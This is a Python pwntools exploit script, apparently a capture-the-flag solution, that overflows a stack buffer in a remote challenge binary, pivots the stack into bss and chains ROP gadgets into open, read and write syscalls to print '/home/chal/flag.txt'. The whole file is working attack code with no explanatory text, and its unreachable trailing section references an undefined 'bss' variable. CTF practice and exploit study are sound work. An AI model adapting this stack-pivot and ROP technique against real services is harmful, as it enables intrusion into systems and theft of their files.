from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# 0000000000401cd5 <main>:
# 0x0000000000448d27 : pop rax ; ret
# 0x0000000000401832 : pop rdi ; ret
# 0x000000000040f01e : pop rsi ; ret
# 0x000000000040173f : pop rdx ; ret
# 0x00000000004012d3 : syscall
# 0x0000000000448280 : syscall ; *** ; ret
# 0x0000000000401cfc : leave ; ret
# 0x000000000040f01b : pop r13 ; pop r14 ; ret
# 0x000000000040182d : pop r13 ; pop r14 ; pop r15 ; ret
# read 0
# write 1
# open 2

bss1 = 0x4C3020
bss2 = bss1 + 0x100

buf = bss1 - 0x820


def main():
    r = remote("10.113.184.121", 10054)
    # r = remote("localhost", 10054)
    # r = process("./share/chal")
    # attach(
    #     r,
    #     """
    #     br main
    #     """,
    # )

    payload = flat(
        [
            0,
            0,
            0,
            0,
            bss1,  # rbp
            0x0000000000401CD5 + 12,  # <main+12>
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    payload = flat(
        [
            u64(b"/home/ch"),  # bss-0x20
            u64(b"al/flag."),
            u64(b"txt".ljust(8, b"\x00")),
            0,
            #
            bss2,  # rbp # bss
            # open
            0x0000000000448D27,  # pop rax ; ret
            2,  # open
            0x0000000000401832,  # pop rdi ; ret
            bss1 - 0x20,  # file
            0x000000000040F01E,  # pop rsi ; ret
            0x0000000000000000,  # flag
            0x000000000040173F,  # pop rdx ; ret
            0x0000000000000000,  # flag
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # ra <main+12>
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    payload = flat(
        [
            0,
            0,
            0,
            0,
            bss1,  # rbp
            # read
            0x0000000000448D27,  # pop rax ; ret
            0,  # read
            0x0000000000401832,  # pop rdi ; ret
            3,  # fd
            0x000000000040F01E,  # pop rsi ; ret
            buf,  # buf
            0x000000000040173F,  # pop rdx ; ret
            0x100,  # size
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # <main+12>
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    payload = flat(
        [
            0,
            0,
            0,
            0,
            bss2,  # rbp
            # write
            0x0000000000448D27,  # pop rax ; ret
            1,  # write
            0x0000000000401832,  # pop rdi ; ret
            1,  # fd
            0x000000000040F01E,  # pop rsi ; ret
            buf,  # buf
            0x000000000040173F,  # pop rdx ; ret
            0x100,  # size
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # <main+12>
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    r.interactive()
    return
    # rbp = bss+0x80
    payload = flat(
        [
            0x0000000000000000,  # read # bss+0x60
            0x0000000000401832,  # pop rdi ; ret
            3,  # fd
            0x000000000040F01B,  # pop r13 ; pop r14 ; ret # bss+0x80
            bss + 0x100,  # rbp # bss+0x88
            0x0000000000401CD5 + 12,  # ra <main+12> # bss+0x90
            0x000000000040F01E,  # pop rsi ; ret # bss+0x78
            buf,  # buf
            0x000000000040173F,  # pop rdx ; ret
            0x100,  # size
            0x00000000004012D3,  # syscall
            # write
            0x0000000000448D27,  # pop rax ; ret
            1,  # write
            0x0000000000401832,  # pop rdi ; ret
            1,  # fd # bss+0xd0
            0x000000000040F01E,  # pop rsi ; ret # bss+0xd8
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    # rbp = bss+0x100
    payload = flat(
        [
            buf,  # buf # bss+0xe0
            0x000000000040173F,  # pop rdx ; ret # bss+0xe8
            0x100,  # size # bss+0xf0
            0x000000000040F01B,  # pop r13 ; pop r14 ; ret # bss+0xf8
            0x00000000004012D3,  # syscall # bss+0x100
            bss,  # bss+0x108
            0x0000000000401CD5 + 12,  # ra <main+12>  # bss+0x110
        ]
    )
    input()
    print(payload)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
